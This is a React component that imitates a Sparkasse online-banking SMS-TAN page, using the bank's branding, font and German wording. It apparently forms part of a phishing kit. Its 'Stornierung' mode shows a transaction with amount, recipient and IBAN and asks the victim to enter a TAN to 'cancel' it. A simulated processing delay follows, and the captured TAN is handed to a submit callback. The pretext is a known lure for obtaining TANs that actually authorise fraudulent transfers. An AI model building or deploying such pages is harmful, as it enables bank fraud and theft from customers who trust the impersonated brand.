import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({ 
  tanType,
  phoneNumber = '+49 *** *** **89',
  transactionDetails = {},
  onSubmit, 
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [isMobile, setIsMobile] = useState(false);

  // Mobile detection
  useEffect(() => {
    const checkMobile = () => {
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile);
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);

  useEffect(() => {
    if (resendCooldown > 0) {
      const timer = setTimeout(() => {
        setResendCooldown(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [resendCooldown]);

  const handleSubmit = async () => {
    if (tan.length !== 6) return;
    
    setIsSubmitting(true);
    
    setTimeout(() => {
      onSubmit(tan);
      setIsSubmitting(false);
    }, 1500);
  };

  const handleResend = () => {
    if (resendCooldown > 0) return;
    
    setResendCooldown(60);
    setTan('');
    onResend?.();
  };

  const handleTanChange = (value: string) => {
    const numericValue = value.replace(/\D/g, '').slice(0, 6);
    setTan(numericValue);
  };

  return (
    <>
      {isSubmitting && (
        <Loading 
          message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird verarbeitet...'}
          type="processing"
          showProgress={true}
          duration={1.5}
        />
      )}
      
      <div className="sparkasse-container" style={{
        maxWidth: '1200px',
        margin: '0 auto',
        padding: isMobile ? '1rem' : '2rem',
        minHeight: '80vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        paddingTop: isMobile ? '2rem' : '4rem'
      }}>
        
        <div className="form-container" style={{
          backgroundColor: 'white',
          borderRadius: '8px',
          padding: '2rem',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          maxWidth: '500px',
          width: '100%',
          margin: '2rem auto'
        }}>
          
          {/* Title with Sparkasse styling */}
          <h1 style={{
            fontSize: isMobile ? '2rem' : '2.5rem',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            fontWeight: 'bold',
            color: '#ff0018',
            marginBottom: '1.5rem',
            textAlign: 'center'
          }}>
            {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
          </h1>
          
          {/* Instruction text */}
          <div className="info-box" style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '8px',
            padding: '1rem',
            marginBottom: '2rem'
          }}>
            <p style={{
              color: '#856404',
              fontSize: '0.9rem',
              margin: 0,
              fontFamily: 'SparkasseWeb, Arial, sans-serif',
              textAlign: 'center'
            }}>
              {tanType === 'TRANSACTION_TAN' 
                ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
              }
            </p>
          </div>

          {/* Transaction details card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div className="sparkasse-card" style={{
              backgroundColor: '#f8f9fa',
              border: '2px solid #ff0018',
              borderRadius: '8px',
              padding: '2rem',
              marginBottom: '2rem'
            }}>
              <h2 style={{
                fontSize: '1.25rem',
                fontFamily: 'SparkasseWeb, Arial, sans-serif',
                fontWeight: 'bold',
                color: '#ff0018',
                marginBottom: '1.5rem',
                textAlign: 'center'
              }}>
                Zu stornierende Transaktion
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                <div style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center',
                  paddingBottom: '0.75rem',
                  borderBottom: '1px solid #dee2e6'
                }}>
                  <span style={{
                    color: '#495057',
                    fontSize: '0.875rem',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif'
                  }}>Betrag:</span>
                  <span style={{
                    color: '#ff0018',
                    fontSize: '1.125rem',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    fontWeight: 'bold'
                  }}>{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #dee2e6'
                  }}>
                    <span style={{
                      color: '#495057',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif'
                    }}>Empfänger:</span>
                    <span style={{
                      color: '#212529',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      textAlign: 'right'
                    }}>{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #dee2e6'
                  }}>
                    <span style={{
                      color: '#495057',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif'
                    }}>IBAN:</span>
                    <span style={{
                      color: '#212529',
                      fontSize: '0.875rem',
                      fontFamily: 'monospace',
                      textAlign: 'right'
                    }}>{transactionDetails.iban}</span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center'
                  }}>
                    <span style={{
                      color: '#495057',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif'
                    }}>Verwendungszweck:</span>
                    <span style={{
                      color: '#212529',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      textAlign: 'right'
                    }}>{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAN Input Section */}
          <div style={{ marginBottom: '2rem' }}>
            <label style={{
              display: 'block',
              color: '#ff0018',
              fontSize: '1rem',
              fontWeight: 'bold',
              marginBottom: '1.5rem',
              fontFamily: 'SparkasseWeb, Arial, sans-serif',
              textAlign: 'center'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
            </label>
            
            <div style={{ 
              display: 'flex', 
              justifyContent: 'center', 
              gap: '0.5rem',
              marginBottom: '2rem'
            }}>
              {[...Array(6)].map((_, i) => (
                <div 
                  key={i} 
                  onClick={() => document.getElementById('hidden-tan-input')?.focus()}
                  style={{
                    width: '50px',
                    height: '60px',
                    border: i < tan.length ? '2px solid #ff0018' : '1px solid #d1d8d9',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '24px',
                    fontWeight: 'bold',
                    color: '#ff0018',
                    backgroundColor: i < tan.length ? '#fff5f5' : 'white',
                    cursor: 'pointer',
                    transition: 'all 0.3s ease',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif'
                  }}
                >
                  {tan[i] || ''}
                </div>
              ))}
            </div>
            
            <input
              id="hidden-tan-input"
              type="text"
              value={tan}
              onChange={(e) => handleTanChange(e.target.value)}
              style={{ position: 'absolute', opacity: 0, pointerEvents: 'none' }}
              autoFocus
            />
          </div>

          {/* Action buttons */}
          <div style={{ marginBottom: '1rem' }}>
            <button
              onClick={handleSubmit}
              disabled={tan.length !== 6 || isSubmitting}
              style={{
                backgroundColor: (tan.length !== 6 || isSubmitting) ? '#6c757d' : '#ff0018',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 24px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: (tan.length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                fontFamily: 'SparkasseWeb, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'block',
                textAlign: 'center',
                width: '100%'
              }}
              onMouseEnter={(e) => {
                if (tan.length === 6 && !isSubmitting) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#e60016';
                  (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                }
              }}
              onMouseLeave={(e) => {
                if (tan.length === 6 && !isSubmitting) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#ff0018';
                  (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                }
              }}
            >
              {isSubmitting 
                ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
              }
            </button>
          </div>

          {/* Footer Links */}
          <div style={{ 
            display: 'flex', 
            flexDirection: 'column', 
            gap: '1rem',
            fontSize: '14px',
            color: '#495057',
            textAlign: 'center'
          }}>
            {onResend && (
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault();
                  handleResend();
                }}
                style={{ 
                  color: resendCooldown > 0 ? '#999' : '#ff0018', 
                  textDecoration: 'none',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  cursor: resendCooldown > 0 ? 'not-allowed' : 'pointer'
                }}
              >
                {resendCooldown > 0 
                  ? `SMS erneut senden (${resendCooldown}s)`
                  : 'SMS erneut senden'
                }
              </a>
            )}
            
            {onCancel && (
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault();
                  onCancel();
                }}
                style={{ 
                  color: '#ff0018', 
                  textDecoration: 'none',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif'
                }}
              >
                {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
              </a>
            )}
          </div>
        </div>
      </div>

      <style jsx>{`
        .sparkasse-container {
          font-family: 'SparkasseWeb', Arial, sans-serif;
        }
        
        @media (max-width: 768px) {
          .sparkasse-container {
            padding: 1rem;
          }
          
          .form-container {
            padding: 1.5rem;
            margin: 1rem auto;
          }
        }
      `}</style>
    </>
  );
};

export default SMSTANScreen;
